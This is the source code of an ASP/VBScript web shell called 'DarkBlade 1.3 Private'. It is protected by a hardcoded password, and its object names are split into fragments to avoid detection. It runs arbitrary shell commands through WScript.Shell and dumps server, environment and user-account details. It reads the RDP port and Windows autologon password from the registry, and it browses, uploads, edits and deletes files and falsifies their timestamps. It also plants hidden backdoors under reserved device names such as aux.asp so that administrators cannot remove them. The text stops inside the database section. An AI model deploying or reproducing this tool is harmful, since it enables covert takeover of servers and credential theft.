<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
<%
Response.Buffer=True
Response.CharSet="utf-8"
Server.ScriptTimeOut=300
'-------------------------------Config-------------------------------
'Private version, do not share it to anybody!
'DarkBlade 1.3 by B100d5w0rd, msn:bloodsword@live.cn
'Final version, no more update
'Thanks to these hackers:Bin, Luyu, Sht
'pass:tencentisapieceofshit
Const pass="4788015D896C4760578FDD87E10A75"'tencentisapieceofshit
Const skw=True
Const aal=42
Const gdzvu=False
Const iul="_"
Const xkur="wjiy|ihx|fwvl|vdgad|npkn|vga|dpqnl|omh|ouo|uhuv|esard|vaxil|wxh|tncir|sxib|lifba|zxsvx|tyhwc|pbshc|qaxei|ekemb"
Const qry="login"
Const tbq="GB2312"
Const fgejg="asp|asa|cer|cdx"
Const cgj="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"
Const zphr=50
Const cwzd="abc.asp"
Const wfsr=true'
'-------------------------------Config-------------------------------

Dim goaction,wjiy,fwvl,vdgad,vga,dpqnl,vmycc,jcy,aplyi,cfho,zaydb,xbo,dhk,crk,cezb,plui,gzf,vuv,bud,juaw,omh,mtz,crxst,whov,ihx,qhgjo,wkfvm,ktsg,pykmg,jbn,aunk,qbh,kbcx,ignq,conn,ouo,lrmn,yjcj,oaquw,pswgc,lcsgr,uhuv,esard,fcz,vaxil,wxh,txmf,tncir,sxib,mzy,nqihw,zgj,tgs,qpry,koooz,mt,lifba,pbshc,zxsvx,tyhwc,lkp,ubg,simp,ndv,npkn,ajvx,wumm,ysktq,flit,zhi,rmpr,exfva,echs,gxyx,fhz,bgem,qgxl,eerrs,prlq,gsgex,nuser,npass,vsbms,ars,qaxei,ekemb,xyw,mfm,tfvyb
ajvx="DarkBlade 1.3 Private"
wumm="DarkBlade"
ysktq="DarkBl"&usm&"adePass"
jeulz()
prlq=cyjn()
If prlq Then
ssf()
Else
goaction=request("goaction")
End If
If Not prlq And goaction<>qry Then jab()
If wfsr And Trim(ids("AUTH"&uzm&"_USER"))="" Then
Response.Status="401 Unau"&wnb&"thorized"
Response.Addheader"WWW-AuThenti"&totbr&"cate","BASIC"
If ids("AUTH"&uzm&"_USER")=""Then Response.End()
End If
Select Case goaction
Case qry
waa()
Case"lgg"
ntpbe()
Case"fqx"
xzis()
Case"uvu"
qgz()
Case"cfxwz"
oixd()
Case"jznyg"
nhzwt()
Case"bbd"
bmhuh()
Case"yauzx"
vwhbt()
Case"croia"
dui()
Case"ueouq"
kjplx()
Case"oplmw"
pwz()
Case"Logout"
nvx()
Case"zep"
rxs()
Case"aeta","bjz"
nlq()
Case Else
nlq()
End Select
okxls
Sub jeulz()
If Not gdzvu Then On Error Resume Next
plui=Timer()
Dim svak,uofw,clky,lhuiq,vzznk,wtqm,miux,xaq
servurl=ids("URL")
Set jcy=wannd("MSX"&fygk&"ML2.XMLH"&uybs&"TTP")
Set aplyi=wannd("WS"&qfmd&"cript.S"&oda&"hell")
Set cfho=wannd("Scrip"&dlbgc&"ting.Fi"&xxjzd&"leSystemObject")
Set zaydb=wannd("Sh"&wzeok&"ell.Applicati"&jaoy&"on")
If Not IsObject(aplyi)Then Set aplyi=wannd("WS"&qfmd&"cript.Sh"&wzeok&"ell.1")
If Not IsObject(zaydb)Then Set zaydb=wannd("Sh"&wzeok&"ell.Applicati"&jaoy&"on.1")
Set dhk=new RegExp
dhk.Global=True
dhk.IgnoreCase=True
dhk.MultiLine=True
vmycc=ids("SERVER_NAME")
crk=ids("PATH_INFO")
cezb=Lcase(aiy(crk,"/"))
vuv=iiju(".")
bud=iiju("/")
qhgjo=1
mtz=1
End Sub
Sub ssf()
For Each uofw In request.queryString
execute uofw&"=request.queryString("""&uofw&""")"
Next
For Each svak In request.Form
execute svak&"=request.form("""&svak&""")"
Next
If InStr(ids("CONTENT_TYPE"),"multipart/form-data")=1 Then
Set ars=new upload_5xsoft
For Each clky In ars.cth
execute clky&"=ars.cth("""&clky&""")"
Next
End If
xaq=Split(xkur,"|")
For Each miux In xaq
execute""&miux&"=fkv("&miux&")"
Next
If Right(wjiy,1)="\"And Len(wjiy)>3 Then wjiy=Left(wjiy,Len(wjiy)-1)
End Sub
Sub okxls()
If Not gdzvu Then On Error Resume Next
Dim exshn
jcy.abort
Set jcy=Nothing
Set aplyi=Nothing
Set cfho=Nothing
Set zaydb=Nothing
Set dhk=Nothing
gzf=timer()
exshn=gzf-plui
echo"<br></div>"
skkkw"100%"
echo"<tr class=""head"">"
echo"<td>"
prj juaw
exshn=FormatNumber(exshn,5)
If Left(exshn,1)="."Then exshn="0"&exshn
prj"<br>"
echo"<div align=right>Processed in :"&exshn&"seconds</div></td></tr></table></body></html>"
Response.End()
End Sub
Sub waa()
If Not gdzvu Then On Error Resume Next
ndv=request("ndv")
If ndv<>""Then
ndv=qiep(ndv)
If qiep(ndv)=pass Then
Response.Cookies(ysktq)=ndv
Response.Redirect(crk)
Else
jdvsp"Fuck you,get out!"
End If
End If
uznjs"Login"
echo"<center><br>"
pppf False
echo"<b>Password : </b>"
vots"password","ndv","","30",""
echo" "
xzs"Get In"
echo"</center></form>"
End Sub
Sub nhzwt()
If Not gdzvu Then On Error Resume Next
Dim i,wvale,xkka,gyxm,qybv,cqavj,efba,jbnr,teyq,kge
gyxm="System"&rlt&"Root|Wi"&fhzy&"nDir|ComS"&jki&"pec|TEMP|TMP|NUMBER_OF_"&ngo&"PROCESSORS|OS|Os2Li"&kaehy&"bPath|Path|PAT"&fmcdc&"HEXT|PROCESSOR_AR"&tmt&"CHITECTURE|"&_
"PROCESSOR_IDEN"&rfsef&"TIfIER|PR"&xpmj&"OCESSOR_LEVEL|PROCESSOR_R"&vsd&"EVISION"
xkka=Split(gyxm,"|")
execute "Set wvale=aplyi.Environ"&kupt&"ment(""SYSTEM"")"
qybv=ids("NUMBER_OF_"&ngo&"PROCESSORS")
If IsNull(qybv)Or qybv=""Then
qybv=wvale("NUMBER_OF_"&ngo&"PROCESSORS")
End If
efba=ids("OS")
If IsNull(efba)Or efba=""Then
efba=wvale("OS")
efba=efba&"(probably Windows 2003)"
End If
cqavj=wvale("PROCESSOR_IDEN"&rfsef&"TIfIER")
uznjs"Server Infomation"
skkkw"100%"
wuosu
echo"<td colspan=""2""align=""center"">"
echo"<b>Server parameters:</b>"
echo"</td>"
jwwxg
mypdl 0
doTd"Server name:",""
doTd vmycc,""
jwwxg
mypdl 1
doTd"Server IP:",""
doTd ids("LOCAL_ADDR"),""
jwwxg
mypdl 0
doTd"Server port:",""
doTd ids("SERVER_PORT"),""
jwwxg
mypdl 1
doTd"Server Me"&vbxja&"mory",""
execute "doTd ilnuo(zaydb.GetSystemInformatio"&ucf&"n(""PhysicalMemoryInstalled"")),"""""
jwwxg
mypdl 0
doTd"Server time",""
doTd Now,""
jwwxg
mypdl 1
doTd"Server soft",""
doTd ids("SERVER_SOFTWARE"),""
jwwxg
mypdl 0
doTd"Script timeout",""
doTd Server.ScriptTimeout,""
jwwxg
mypdl 1
doTd"Number of cpus",""
doTd qybv,""
jwwxg
mypdl 0
doTd"Info of cpus",""
doTd cqavj,""
jwwxg
mypdl 1
doTd"Server OS",""
doTd efba,""
jwwxg
mypdl 0
doTd"Server script engine",""
doTd ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion,""
jwwxg
mypdl 1
doTd"File full path",""
doTd ids("PATH_TRANSLATED"),""
jwwxg
mtz=0
For i=0 To UBound(xkka)
mypdl mtz
doTd xkka(i)&":",""
execute "doTd aplyi.ExpandEnviro"&xqk&"nmentStrings(""%""&xkka(i)&""%""),"""""
jwwxg
cdama
Next
iroyi
byv(Err)
echo"<br>"
Set wvale=Nothing
Dim bne
skkkw"100%"
wuosu
echo"<td colspan=""6""align=""center"">"
echo"<b>Info of disks</b>"
echo"</td>"
jwwxg
mypdl 0
doTd"Driver letter",""
doTd"Type",""
doTd"Label",""
doTd"File system",""
doTd"Space left",""
doTd"Total space",""
jwwxg
mtz=1
For Each bne In cfho.Drives
Dim oclje,lrlrz,udech,lsx,euya,rgzjr
oclje=bne.DriveLetter
If Lcase(oclje)<>"a"Then
lrlrz=jzf(bne.DriveType)
udech=bne.VolumeName
lsx=bne.Filesystem
euya=ilnuo(bne.FreeSpace)
execute "rgzjr=ilnuo(bne.To"&rfomh&"talSize)"
mypdl mtz
doTd oclje,""
doTd lrlrz,""
doTd udech,""
doTd lsx,""
doTd euya,""
doTd rgzjr,""
jwwxg
End If
oclje=""
lrlrz=""
udech=""
lsx=""
euya=""
rgzjr=""
cdama
Next
iroyi
byv(Err)
Set bne=Nothing
Dim pswk
Set pswk=cfho.GetFolder(bud)
echo"<br>"
skkkw"100%"
wuosu
echo"<td colspan=""2""align=""center"">"
echo"<b>Info of site:</b>"
echo"</td>"
jwwxg
mypdl 0
doTd"Phys"&xuohe&"ical path:",""
doTd bud,""
jwwxg
mypdl 1
doTd"Current size:",""
doTd ilnuo(pswk.Size),""
jwwxg
mypdl 0
doTd"File count:",""
doTd pswk.Files.Count,""
jwwxg
mypdl 1
doTd"Folder count:",""
doTd pswk.SubFolders.Count,""
jwwxg
iroyi
byv(Err)
prj"<br>"
Dim qddd,vhj,igyy
Dim lfxh,nye,fdxb,jqjr
jbnr="HKEY_LOCAL_MACHINE\SYSTEM\Curren"&ghfkv&"tControlSet\Control\Termin"&ifbxw&"al Server\Win"&zoh&"Stations\RDP-"&wrty&"Tcp\"
teyq="PortNumber"
kge=bytxz(jbnr&teyq)
If kge=""Then kge="Can't get Termin"&ifbxw&"al port.<br/>"
qddd="HK"&gsw&"LM\SOFTWA"&qwse&"RE\Microsoft\Windows "&gud&"NT\Cur"&rtcm&"rentVersion\Wi"&atnga&"nlogon\"
nye="Au"&zbich&"toAdminLogon"
vhj="DefaultUser"&ktus&"Name"
igyy="Def"&krvi&"aultPassword"
lfxh=bytxz(qddd&nye)
If lfxh=0 Then
fdxb="Autologin isn't enabled"
Else
fdxb=bytxz(qddd&vhj)
End If
If lfxh=0 Then
jqjr="Autologin isn't enabled"
Else
jqjr=bytxz(qddd&igyy)
End If
skkkw"100%"
wuosu
echo"<td colspan=""2""align=""center"">"
echo"<b>Info of Termin"&ifbxw&"al port&Autologin</b>"
echo"</td>"
jwwxg
mypdl 0
doTd"Termin"&ifbxw&"al port:",""
doTd kge,""
jwwxg
mypdl 1
doTd"Autologin account:",""
doTd fdxb,""
jwwxg
mypdl 0
doTd"Autologin password:",""
doTd jqjr,""
jwwxg
iroyi
echo"</ol>"
byv(Err)
End Sub
Sub ntpbe()
Dim i,ojk,nyfm,llbqt
nyfm="MSW"&olie&"C.AdRotator,MSW"&olie&"C.BrowserTy"&vhynu&"pe,MSW"&olie&"C.NextLink,MSW"&olie&"C.TOOLS,MSW"&olie&"C.Status,MSW"&olie&"C.Counters,IISSam"&wjl&"ple.ContentRotat"&dyb&"or,IISSam"&wjl&"ple.Pa"&dvvv&"geCounter,MSW"&olie&"C.Permission"&tczi&"Checker,Ad"&rgc&"odb.Conne"&ytwmf&"ction,SoftA"&zjru&"rtisans.Fi"&vjtoc&"leUp,SoftA"&zjru&"rtisans.FileMana"&dzya&"ger,LyfUpload.UploadFile,Pe"&mqqr&"rsits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Pe"&mqqr&"rsits.Mailsender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftA"&zjru&"rtisans.ImageGen,W3Image.Image,Scrip"&dlbgc&"ting.Fi"&xxjzd&"leSystemObject,Ad"&rgc&"odb.St"&jgcbg&"ream,Sh"&wzeok&"ell.Applicati"&jaoy&"on,Sh"&wzeok&"ell.Applicati"&jaoy&"on.1,WS"&qfmd&"cript.S"&oda&"hell,WS"&qfmd&"cript.Sh"&wzeok&"ell.1,WS"&qfmd&"cript.Network,hzhost.modules"
llbqt="Ad Rotator,Browser info,NextLink,,,Counters,Content rotator,,Permission checker,ADODB connection,SA-FileUp,SoftArtisans FileManager,LyfUpload,ASPUpload,Dimac upload,Dimac JMail,CDONTS SMTP mail,ASPemail,ASPmail,dkQmail,Geocel mail,IISmail,SmtpMail,SoftArtisans ImageGen,Dimac W3Image,FSO,Stream ,,,,,,Hzhost module"
aryObjectList=Split(nyfm,",")
aryDscList=Split(llbqt,",")
uznjs"Server Object Probe"
echo"Check for other ObjectId or ClassId.<br>"
pppf True
vots"text","omh",omh,50,""
echo" "
xzs"Check"
xpor
If omh<>""Then
rwxiy
Call sikc(omh,"")
echo"</ul>"
End If
echo"<hr/>"
echo"<ul class=""info""><li><u>Object name</u>Status and more</li>"
For i=0 To UBound(aryDscList)
Call sikc(aryObjectList(i),aryDscList(i))
Next
echo"</ul><hr/>"
End Sub
Sub xzis()
Dim kns,zoiz,dowwj
uznjs"Users and Groups Imformation"
Set dowwj=getObj("WinNT://.")
dowwj.Filter=Array("User")
slv"User",False
skkkw"100%"
For Each kns in dowwj
wuosu
echo"<td colSpan=""2""align=""center""><b>"&kns.Name&"</b></td>"
jwwxg
ejh(kns.Name)
Next
iroyi
echo"</span><br>"
byv(Err)
slv"UserGroup",False
dowwj.Filter=Array("Group")
skkkw"100%"
mtz=1
For Each zoiz in dowwj
mypdl mtz
doTd zoiz.Name,""
doTd zoiz.Description,""
jwwxg
cdama
Next
iroyi
echo"</span>"
byv(Err)
End Sub
Sub qgz()
If Not gdzvu Then On Error Resume Next
Dim gob,xcas,spjc,xhs
If crxst<>""Then Session(crxst)=whov
uznjs"Server-Client Information"
slv"ServerVariables",True
skkkw"100%"
mtz=1
For Each spjc In Request.ServerVariables
mypdl mtz
agb spjc
doTd ids(spjc),""
jwwxg
cdama
Next
iroyi
prj"</span><br>"
slv"Application",True
skkkw"100%"
mtz=1
For Each spjc In Application.Contents
mypdl mtz
agb spjc
doTd uhu(Application(spjc)),""
jwwxg
cdama
Next
iroyi
prj"</span><br>"
slv"Session",True
echo"<br>(ID"&Session.SessionId&")"
skkkw"100%"
mtz=1
For Each spjc In Session.Contents
xhs=Session(spjc)
mypdl mtz
agb spjc
doTd uhu(xhs),""
jwwxg
cdama
Next
mypdl mtz
pppf False
ckzt"Set Session","20%"
echo"<td width=""80%""> Key :"
vots"text","crxst","",30,""
echo"Value :"
vots"text","whov","",30,""
echo"</td>"
xpor
jwwxg
iroyi
prj"</span><br>"
slv"Cookies",True
skkkw"100%"
mtz=1
For Each spjc In Request.Cookies
If Request.Cookies(spjc).HasKeys Then
For Each gob In Request.Cookies(spjc)
mypdl mtz
agb spjc&"("&gob&")"
doTd uhu(Request.Cookies(spjc)(gob)),""
jwwxg
cdama
Next
Else
mypdl mtz
agb spjc
doTd uhu(Request.Cookies(spjc)),""
jwwxg
cdama
End If
Next
iroyi
echo"</span>"
byv(Err)
End Sub
Sub oixd()
Dim ufwx,cmj
If Not gdzvu Then On Error Resume Next
uznjs("WS"&qfmd&"cript.S"&oda&"hell Execute")
If ihx<>""Then
If InStr(Lcase(ihx),"cmd.exe")>0 And InStr(fwvl,"/c ")<1 Then
cmj=ihx&" /c "&fwvl
Else
cmj=ihx&" "&fwvl
End If
If fhz=1 Then
execute "ufwx=aplyi.Ex"&zdqq&"ec(cmj).StdOut.R"&mzk&"eadAll()"
Else
execute "aplyi.Ru"&med&"n cmj,0,False"
End If
byv(Err)
Else
ihx="cmd.exe"
End If
skkkw"100%"
pppf True
mypdl 1
doTd"Path","20%"
gsj"text","ihx",ihx,"60%","",""
echo"<td>"
rfc"fhz",1," View result ","checked"
xzs"Run"
echo"</td>"
jwwxg
mypdl 0
doTd"Parameters",""
gsj"text","fwvl",fwvl,"","","2"
jwwxg
xpor
iroyi
echo"<hr><b>Result:</b><br><span class=""alt1Span"">"&uhu(ufwx)&"</span>"
byv(Err)
End Sub
Sub nlq()
If Not gdzvu Then On Error Resume Next
If wjiy=""Then wjiy=dpqnl
If wjiy=""Then wjiy=vuv
If goaction<>"aeta"Then goaction="bjz"
If wkfvm="down"Then
ijv()
Response.End()
End If
If goaction="bjz"Then
jbn="fso"
uznjs("FSO File Explorer")
Else
jbn="sa"
uznjs("APP File Explorer")
End If
Select Case wkfvm
Case"aay","ohp"
lbhn()
wjiy=snqsz(wjiy,"\",False)
Case"cnd"
cnd()
Case"save","kcbe"
oubu()
wjiy=snqsz(wjiy,"\",False)
Case"uqezp"
myccq()
Case"omt","uen"
omt()
Case"vhjf","gnfr"
wstda()
wjiy=snqsz(wjiy,"\",False)
Case"wkicu","okio","ehwr","cmhk"
xms()
wjiy=snqsz(wjiy,"\",False)
Case"upi"
dhj()
Case"sxg"
crj()
wjiy=snqsz(wjiy,"\",False)
Case"qvihx"
beyb()
End Select
If Len(wjiy)<3 Then wjiy=wjiy&"\"
pwbo()
End Sub
Sub pwbo()
Dim theFolder,ujq,rzpu,qot,taef,ehlw,qnzov,ydc
If Not gdzvu Then On Error Resume Next
If jbn="fso"Then
Set theFolder=cfho.GetFolder(wjiy)
qot=cfho.GetParentFolderName(wjiy)
Else
execute "Set theFolder=zaydb.Nam"&elq&"eSpace(wjiy)"
jplxa Err
qot=snqsz(wjiy,"\",False)
If InStr(qot,"\")<1 Then
qot=qot&"\"
End If
End If
ydc=wjiy
If Right(ydc,1)<>"\"Then ydc=ydc&"\"
olisd"ydc",ydc
pppf True
echo"<b>Current Path :</b>"
vots"text","wjiy",wjiy,120,""
prj""
arqt"","170px","onchange=""javascript:if(this.value!=''){xzs('"&goaction&"','',this.value);}"""
isbb"","Drivers/Comm folders"
isbb uhu(iiju(".")),"."
isbb uhu(iiju("/")),"/"
isbb"","----------------"
If Lcase(jbn)="fso"Then
For Each drive In cfho.Drives
execute "isbb drive.D"&wnz&"riveLetter&"":\"",drive.D"&wnz&"riveLetter&"":\"""
Next
isbb"","----------------"
End If
isbb"C:\Program Files","C:\Program Files"
isbb"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
isbb"C:\Program Files\Ser"&tpzkq&"v-U","Ser"&tpzkq&"v-U"
isbb"C:\Program Files\Rad"&qjt&"min","Rad"&qjt&"min"
isbb"C:\Program Files\Microsoft SQL Server","Mssql"
isbb"C:\Program Files\Mysql","Mysql"
isbb"","----------------"
isbb"C:\Documents and Settings\All Users","All Users"
isbb"C:\Documents and Settings\All Users\Documents","Documents"
isbb"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
isbb"C:\Documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
isbb"","----------------"
isbb"D:\Program Files","D:\Program Files"
isbb"D:\Ser"&tpzkq&"v-U","D:\Ser"&tpzkq&"v-U"
isbb"D:\Rad"&qjt&"min","D:\Rad"&qjt&"min"
isbb"D:\Mysql","D:\Mysql"
iesnd
xzs"Go"
xpor
prj"<br><form method=""post"" id=""upform""action="""&crk&"""enctype=""multipart/form-data"">"
olisd"wkfvm","uqezp"
olisd"wjiy",wjiy
skkkw"60%"
mypdl 1
gsj"file","upfile","","30%","",""
doTd"Save As :","15%"
gsj"text","qaxei","","30%","",""
gsj"button",""," Upload  ","20%","onClick=""javascript:xzs('"&goaction&"','uqezp','')""",""
jwwxg
xpor
If jbn="fso"Then
mypdl 0
pppf True
olisd"wjiy",wjiy
olisd"wkfvm","cnd"
gsj"text","qbh","","","",""
echo"<td colspan='2'>"
vots"radio","kbcx","file","","checked"
echo"File"
vots"radio","kbcx","folder","",""
echo"Folder</td>"
ckzt"New one",""
'gsj"button","makedoor","Make backdoor","","onClick=""javascript:xzs('"&goaction&"','qvihx','"&omrpv(wjiy)&"')""",""
xpor
jwwxg
End If
echo"</table><hr>"
If jbn="fso"Then
If Not cfho.FolderExists(wjiy)Then
jdvsp wjiy&" Folder dosen't exists or access denied!"
okxls
End If
End If
slv"Folders",False
skkkw"100%"
wuosu
doTd"<b>Folder name</b>",""
doTd"<b>Size</b>",""
doTd"<b>Last modIfied</b>",""
echo"<td><b>Action</b>"
If jbn="fso"Then 
echo" - "
fach goaction,"qvihx",omrpv(wjiy),"Make a hidden backdoor here",""
End If
echo"</td>"
jwwxg
mypdl 0
echo"<td colspan=""4"">"
fach goaction,"",omrpv(qot),"Parent Directory",""
echo"</td>"
jwwxg
mtz=1
If jbn="fso"Then
For Each objX In theFolder.SubFolders
qnzov=objX.DateLastModIfied
mypdl mtz
echo"<td>"
fach goaction,"",objX.Name,objX.Name,""
echo"</td>"
doTd uhu("<dir>"),""
doTd qnzov,""
echo"<td>"
fach goaction,"ehwr",objX.Name,"Copy"," -"
fach goaction,"cmhk",objX.Name,"Move"," -"
fach goaction,"gnfr",objX.Name,"Rename"," -"
fach "zep","kmulx",objX.Name,"Package"," -"
fach goaction,"ohp",objX.Name,"Delete",""
prj"</td>"
jwwxg
cdama
Next
Else
For Each objX In theFolder.Items
If objX.IsFolder Then
qnzov=theFolder.GetDetailsOf(objX,3)
mypdl mtz
echo"<td>"
fach goaction,"",objX.Name,objX.Name,""
echo"</td>"
doTd uhu("<dir>"),""
doTd qnzov,""
echo"<td>"
fach goaction,"gnfr",objX.Name,"Rename"," -"
fach "zep","bbn",objX.Name,"Package",""
prj"</td>"
jwwxg
cdama
End If
Next
End If
iroyi
prj"</span><br>"
slv"Files",False
skkkw"100%"
echo"<b>"
wuosu
doTd"<b>File name</b>",""
doTd"<b>Size</b>",""
doTd"<b>Last modIfied</b>",""
doTd"<b>Action</b>",""
jwwxg
echo"</b>"
mtz=0
If jbn="fso"Then
For Each objX In theFolder.Files
taef=ilnuo(objX.Size)
qnzov=objX.DateLastModIfied
If Lcase(Left(objX.Path,Len(bud)))<>Lcase(bud) Then
ujq=""
Else
ujq=Replace(Replace(lcbr(Mid(objX.Path,Len(bud)+1)),"%2E","."),"+","%20")
End If
mypdl mtz
If ujq=""Then
doTd objX.Name,""
Else
doTd"<a href='"&Replace(ujq,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
End If
doTd taef,""
doTd qnzov,""
echo"<td>"
fach goaction,"omt",objX.Name,"Edit"," -"
fach goaction,"wkicu",objX.Name,"Copy"," -"
fach goaction,"okio",objX.Name,"Move"," -"
fach goaction,"vhjf",objX.Name,"Rename"," -"
fach goaction,"down",objX.Name,"Down"," -"
fach goaction,"upi",objX.Name,"Attributes"," -"
tcpp "oyhh",objX.Name,"","","","Database"," -"
fach goaction,"aay",objX.Name,"Delete",""
prj"</td>"
jwwxg
cdama
Next
Else
For Each objX In theFolder.Items
If Not objX.IsFolder Then
Dim wqifc
wqifc=aiy(objX.Path,"\")
ehlw=omrpv(objX.Path)
taef=theFolder.GetDetailsOf(objX,1)
qnzov=theFolder.GetDetailsOf(objX,3)
If Lcase(Left(objX.Path,Len(bud)))<>Lcase(bud) Then
ujq=""
Else
ujq=Replace(Replace(lcbr(Mid(objX.Path,Len(bud)+1)),"%2E","."),"+","%20")
End If
mypdl mtz
If ujq=""Then
doTd aiy(objX.Path,"\"),""
Else
doTd"<a href='"&Replace(ujq,"%5C","/")&"' target=_blank>"& aiy(objX.Path,"\")&"</a>",""
End If
doTd taef,""
doTd qnzov,""
echo"<td>"
fach goaction,"omt",wqifc,"Edit"," -"
fach goaction,"vhjf",wqifc,"Rename"," -"
fach goaction,"down",wqifc,"Down"," -"
fach goaction,"upi",wqifc,"Attributes"," -"
tcpp "oyhh",wqifc,"","","","Database",""
prj"</td>"
jwwxg
cdama
End If
Next
End If
iroyi
echo"</span>"
byv(Err)
End Sub
Sub dhj()
Dim xczkn,zbku,sib,jet,iihmx,ydqp,jmdc,kuce
If Not gdzvu Then On Error Resume Next
If IsObject(cfho)Then
Set xczkn=cfho.GetFile(wjiy)
End If
If IsObject(zaydb)Then
jmdc=snqsz(wjiy,"\",False)
sib=aiy(wjiy,"\")
execute "Set ydqp=zaydb.Nam"&swz&"eSpace(jmdc)"
Set zbku=ydqp.ParseName(sib)
End If
echo"<center>"
skkkw"60%"
pppf True
olisd"wkfvm","sxg"
olisd"wjiy",wjiy
mypdl 1
ckzt"Set / Clone",""
doTd wjiy,""
jwwxg
mypdl 0
doTd"Attributes",""
If IsObject(cfho)Then
iihmx=xczkn.Attributes
jet="<input type=checkbox name=eerrs value=4 class='input' {$system}>system "
jet=jet&"<input type=checkbox name=eerrs value=2 class='input' {$hidden}>hide "
jet=jet&"<input type=checkbox name=eerrs value=1 class='input' {$readonly}>readonly "
jet=jet&"<input type=checkbox name=eerrs value=32 class='input' {$archive}>save "
If iihmx>=128 Then iihmx=iihmx-128
If iihmx>=64 Then iihmx=iihmx-64
If iihmx>=32 Then
iihmx=iihmx-32
jet=Replace(jet,"{$archive}","checked")
End If
If iihmx>=16 Then iihmx=iihmx-16
If iihmx>=8 Then iihmx=iihmx-8
If iihmx>=4 Then
iihmx=iihmx-4
jet=Replace(jet,"{$system}","checked")
End If
If iihmx>=2 Then
iihmx=iihmx-2
jet=Replace(jet,"{$hidden}","checked")
End If
If iihmx>=1 Then
iihmx=iihmx-1
jet=Replace(jet,"{$readonly}","checked")
End If
doTd jet,""
Else
doTd"FSO object disabled,can't get/Set attributes -_-~!",""
End If
jwwxg
If IsObject(zaydb)Then
mypdl 1
doTd"Date created",""
doTd ydqp.GetDetailsOf(zbku,4),""
jwwxg
mypdl 0
doTd"Date last modIfied",""
gsj"text","bgem",ydqp.GetDetailsOf(zbku,3),"","",""
jwwxg
mypdl 1
doTd"Date last accessed",""
doTd ydqp.GetDetailsOf(zbku,5),""
jwwxg
Else
mypdl 1
doTd"Date created",""
execute "doTd xczkn.Da"&trkgr&"teCreated,"""""
jwwxg
mypdl 0
doTd"Date last modIfied",""
doTd xczkn.DateLastModIfied,""
jwwxg
mypdl 1
doTd"Date last accessed",""
doTd xczkn.DateLastAccessed,""
jwwxg
End If
mypdl 0
If IsObject(zaydb)Then
doTd"Clone time ",""
echo"<td>"
arqt"qgxl","100%",""
isbb "","Do not clone"
For Each objX In ydqp.Items
If Not objX.IsFolder Then
kuce=aiy(objX.Path,"\")
isbb kuce,ydqp.GetDetailsOf(ydqp.ParseName(kuce),3)&" --- "&kuce
End If
Next
Else
echo"<td colspan=2>App object disabled,can't modIfy time -_-~!</td>"
End If
iroyi
xpor
okxls()
End Sub
Sub crj()
If Not gdzvu Then On Error Resume Next
Dim jocm,xczkn,jmdc,sib,ydqp,zbku
If IsObject(cfho)Then
Set xczkn=cfho.GetFile(wjiy)
End If
If IsObject(zaydb)Then
jmdc=snqsz(wjiy,"\",False)
sib=aiy(wjiy,"\")
execute "Set ydqp=zaydb.Nam"&swz&"eSpace(jmdc)"
Set zbku=ydqp.ParseName(sib)
End If
If eerrs<>""Then
eerrs=Split(Replace(eerrs," ",""),",")
For i=0 To UBound(eerrs)
jocm=jocm+CInt(eerrs(i))
Next
xczkn.Attributes=jocm
If Err Then
byv(Err)
Else
jdvsp"Attributes modIfied"
End If
End If
If qgxl=""Then
If bgem<>"" And IsDate(bgem)Then
zbku.ModIfyDate=bgem
If Err Then
byv(Err)
Else
jdvsp"Time modIfied"
End If
End If
Else
zbku.ModIfyDate=ydqp.GetDetailsOf(ydqp.ParseName(qgxl),3)
If Err Then
byv(Err)
Else
jdvsp"Time modIfied"
End If
End If
End Sub
Sub beyb()
If fileName<>""Then
Dim viu,tsuct
viu="\\.\"&wjiy&"\"&fileName
If tfvyb=1 Then
execute "Call cfho.M"&kmvta&"oveFile(ids(""PATH_TRANSLATED""),viu)"
Set tsuct=cfho.GetFile(viu)
tsuct.Attributes=6
Response.Redirect(fileName)
Else
pjby viu,aunk
Set tsuct=cfho.GetFile(viu)
tsuct.Attributes=6
End If
If Err Then
byv(err)
Else
jdvsp("Backdoor established,have fun.")
End If
Exit Sub
End If
pppf True
skkkw"100%"
olisd"wkfvm","qvihx"
prj"<b>Make hidden backdoor</b><br>"
skkkw"100%"
mypdl 1
doTd"Path","20%"
gsj"text","wjiy",wjiy,"60%","",""
ckzt"Save","20%"
jwwxg
mypdl 0
doTd"Content",""
wdjc "aunk","",10
echo"<td>"
rfc"tfvyb",1,"Move myself there","onclick='javascript:document.getElementById(""aunk"").disabled=this.checked'"
echo"</td>"
jwwxg
mypdl 1
echo"<td>"
arqt"fileName","100%",""
isbb"aux.asp","aux.asp"
isbb"con.asp","con.asp"
isbb"com1.asp","com1.asp"
isbb"com2.asp","com2.asp"
isbb"nul.asp","nul.asp"
isbb"prn.asp","prn.asp"
iesnd
echo"</td>"
prj"<td colspan='2'>Cannot del,cannot open in ordinary way,this will drive the web administrator madness :)</td>"
jwwxg
iroyi
xpor
okxls
End Sub
Sub bmhuh()
If Not gdzvu Then On Error Resume Next
If vdgad=""Then vdgad=Request.Cookies(wumm&"vdgad")
vrqs()
If vdgad<>""Then
Select Case wkfvm
Case"evu"
evu()
Case"zzx"
zzx()
Case"eow"
eow()
Case"tvao","tgugh"
ndt()
Case Else
oyhh()
End Select
End If
jhbt
okxls
End Sub
Sub vrqs()
Dim rs,jjjv,czw,qieq
If Not gdzvu Then On Error Resume Next
uznjs("Database Operation")
pppf True
prj"Connect String : "
vots"text","vdgad",vdgad,160,""
echo" "
xzs"OK"
xpor
slv"GetConnectString",True
skkkw"100%"
mypdl 1
doTd"SqlOleDb","10%"
prj"<td style=""width:80%"">Server:"
vots"text","MsServer","127.0.0.1","15",""
echo" Username:"
vots"text","MsUser","sa","10",""
echo" Password:"
vots"text","MsPass","","10",""
echo" DataBase:"
vots"text","DBPath","","10",""
echo"</td>"
gsj"button","","Generate","10%","onClick=""javascript:apxyh(MsServer.value,MsUser.value,MsPass.value,DBPath.value)""",""
jwwxg
mypdl 0
doTd"Jet",""
prj"<td>DB path:"
vots"text","accdbpath",vuv&"\","82",""
echo"</td>"
